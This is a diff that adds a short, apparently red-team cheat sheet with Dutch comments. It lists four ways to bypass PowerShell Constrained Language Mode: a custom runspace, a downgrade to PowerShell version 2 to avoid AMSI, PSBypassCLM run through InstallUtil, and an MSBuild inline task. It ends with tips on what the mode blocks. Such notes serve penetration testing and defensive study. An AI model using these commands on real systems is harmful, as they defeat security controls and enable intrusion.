@@ -1,0 +1,13 @@
+# PowerShell Constrained Language Mode (CLM) Bypass
+# Methode 1: Custom runspace (omzeilt CLM restricties)
+powershell -c "$rs=[runspacefactory]::CreateRunspace();$rs.ApartmentState='STA';$rs.ThreadOptions='ReuseThread';$rs.Open();$p=$rs.CreatePipeline();$p.Commands.AddScript('$ExecutionContext.SessionState.LanguageMode');$p.Invoke()"
+# Methode 2: PowerShell versie 2 (geen AMSI, geen CLM)
+powershell -version 2 -c "$ExecutionContext.SessionState.LanguageMode"
+# Methode 3: PSBypassCLM tool
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\tasks\PSBypassCLM.exe
+# Methode 4: Via MSBuild inline task (C# code buiten CLM)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\tasks\clm_bypass.xml
+# Check huidige language mode:
+powershell -c "$ExecutionContext.SessionState.LanguageMode"
+# Tip: CLM blokkeert Add-Type, New-Object, en .NET method calls
+# Tip: In CLM kun je wel cmdlets aanroepen - alleen .NET interop is beperkt
